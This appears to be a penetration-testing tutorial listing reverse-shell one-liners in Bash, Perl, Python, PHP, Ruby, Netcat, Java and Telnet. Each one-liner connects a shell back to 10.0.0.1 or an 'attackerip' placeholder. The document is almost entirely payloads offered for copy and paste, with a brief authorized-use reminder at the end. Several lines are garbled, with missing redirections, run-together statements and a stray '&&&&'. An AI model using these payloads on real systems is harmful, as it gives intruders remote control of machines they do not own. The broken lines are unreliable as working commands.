## Introduction

If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterward you’ll probably want an interactive shell. If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.

Your options for creating a reverse shell are limited by the scripting languages installed on the target system – although you can probably download a binary program if you are properly prepared. The examples shown are tailored to Unix-like systems. Some of the examples below should also work on Windows if you use substitute "`/bin/sh -i`" with "`cmd.exe`". Each of the methods below is aimed to be a one-liner that you can copy/paste. As such they’re quite short lines, but not very readable.

* * *

### BASH

Some versions of bash can send you a reverse shell (this was tested on Ubuntu 18.04)

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Or

```bash
exec /bin/bash 0&0 2>&0
```

Or

```bash
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
```

Or

```bash
exec 5<>/dev/tcp/attackerip/4444cat <&5 | while read line; do $line 2>&5 >&5; done
```

Or

```bash
while read line 0<&5; do $line 2>&5 >&5; done
```

* * *

### PERL

Here’s a short, feature-free version that depends on /bin/sh:

```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Perl reverse shell that does not depend on /bin/sh:

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

If the target system is running Windows use the following one-liner:

```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

* * *

### PYTHON

This was tested under Linux / Python 2.7

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* * *

### PHP

This code assumes that the TCP connection uses file descriptor 3. This worked on the most tested system. If it doesn't work, try 4, 5, 6…

```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

* * *

### RUBY

Short version that depends on /bin/sh:

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Longer Ruby reverse shell that does not depend on /bin/sh:

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

If the target system is running Windows use the following one-liner:

```bash
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

* * *

### NETCAT

Netcat is rarely present on production systems and even if it is there are several versions of Netcat, some of which don’t support the -e option.

```bash
nc -e /bin/sh 10.0.0.1 1234
```

Others possible Netcat reverse shells, depending on the Netcat version and compilation flags:

```bash
nc -c /bin/sh attackerip 4444
```

Or

```bash
/bin/sh | nc attackerip 4444
```

Or

```bash
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
```

* * *

### JAVA

Always present when you need it, the "Java" language can also be a very good solution to establish a reverse shell.

```bash
r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()
```

* * *

### TELNET

Of course, you can also use Telnet as an alternative for Netcat:

```bash
rm -f /tmp/p; mknod /tmp/p p &&&& telnet attackerip 4444 0/tmp/p
```

Or

```bash
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
```

* * *

## Conclusion

In this tutorial, we explored various methods for creating reverse shells during penetration tests. We covered examples in different scripting languages, including Bash, Perl, Python, PHP, Ruby, Netcat, Java, and even Telnet. These one-liners allow you to establish an interactive shell on the target system, even when adding new accounts or SSH keys isn’t feasible.

Remember to use these techniques responsibly and only in authorized scenarios. Always obtain proper permissions before attempting any penetration testing activities. Happy hacking!